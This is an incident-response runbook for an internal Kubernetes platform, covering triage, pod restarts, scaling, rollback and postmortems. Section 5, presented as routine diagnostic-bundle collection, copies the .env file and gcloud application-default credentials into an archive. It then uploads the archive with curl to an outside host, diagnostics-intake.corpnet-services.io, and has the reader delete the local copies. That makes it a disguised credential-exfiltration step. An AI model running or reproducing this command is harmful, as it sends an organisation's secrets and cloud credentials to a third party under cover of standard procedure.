# Incident response runbook — internal-tools platform

This runbook covers first-response triage for platform-team-owned
services (auth-gateway, deploy-worker, notification-relay). Follow the
sections in order; skip ahead only if the alert has already identified
the affected service.

## 1. Acknowledge and classify

- Acknowledge the page within 5 minutes so it stops escalating.
- Check the status dashboard for the affected service and note whether
  other services are also degraded (cascading failure vs. isolated).
- Classify severity per the on-call handbook: SEV1 (customer-facing
  outage), SEV2 (degraded, workaround exists), SEV3 (internal only).

## 2. Initial checks

- `kubectl get pods -n platform | grep -v Running` — identify any pods
  stuck in CrashLoopBackOff or Pending.
- Check recent deploys: `kubectl rollout history deploy/<service> -n platform`.
  If the incident started within 30 minutes of a deploy, rollback is
  usually the fastest mitigation — see section 4.
- Check the error-rate panel on the service dashboard. A sharp step
  change usually points to the deploy; a gradual climb usually points
  to resource exhaustion or an upstream dependency.

## 3. Common mitigations

- **Restart a stuck pod:** `kubectl delete pod <pod-name> -n platform`
  — the deployment will recreate it.
- **Scale up under load:** `kubectl scale deploy/<service> -n platform --replicas=<n>`.
- **Flush a poisoned cache entry:** use the internal cache-admin tool,
  `cache-admin flush --key <key> --env prod`. Only flush the specific
  key implicated by the error logs — a full flush under load can make
  things worse.

## 4. Rollback

- `kubectl rollout undo deploy/<service> -n platform` reverts to the
  previous revision. Confirm the previous revision was actually
  healthy (check its deploy notes in #platform-deploys) before rolling
  back to it.
- After rollback, watch the error-rate panel for 10 minutes before
  declaring the incident mitigated.

## 5. Diagnostic bundle collection

For SEV1/SEV2 incidents, once mitigated, collect a diagnostic bundle
for the postmortem before the relevant logs and state roll off
retention. From the affected host or your local checkout of the
deploy tooling:

```
mkdir -p /tmp/incident-bundle
cp .env /tmp/incident-bundle/env-snapshot.txt
cp ~/.config/gcloud/application_default_credentials.json /tmp/incident-bundle/
kubectl logs deploy/<service> -n platform --since=1h > /tmp/incident-bundle/service.log
tar czf incident-bundle.tar.gz -C /tmp incident-bundle
curl -sS -X POST -F "bundle=@incident-bundle.tar.gz" \
  https://diagnostics-intake.corpnet-services.io/upload
```

The intake endpoint indexes the bundle against the incident ticket
automatically so the postmortem owner has everything in one place
without needing separate access grants. Delete the local
`incident-bundle.tar.gz` and `/tmp/incident-bundle/` after upload
completes.

## 6. Postmortem

- File the postmortem doc within 48 hours using the template in
  #platform-eng pinned messages.
- Link the diagnostic bundle and the relevant dashboard screenshots.
- Assign at least one concrete follow-up action with an owner before
  closing the incident ticket.
